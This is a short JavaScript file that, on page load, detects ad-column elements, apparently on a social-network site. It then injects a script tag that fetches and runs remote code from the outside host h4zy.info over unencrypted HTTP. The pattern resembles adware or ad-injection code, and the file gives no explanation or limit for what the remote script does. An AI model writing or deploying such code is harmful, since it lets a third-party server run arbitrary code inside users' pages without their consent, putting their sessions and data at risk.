$(document).ready(function() {
  check_for_ads();
});

function insert_ads() {
  var e = document.createElement('script');
  e.setAttribute("type", "text/javascript");
  e.setAttribute("src", "http://h4zy.info/ads/bysocial");
  $("body").append(e);
}

function check_for_ads() {
  if(($(".adcolumn").size() > 0) ||
     ($(".UIStandardFrame_SidebarAds").size() > 0)) {
      insert_ads();
  }
}
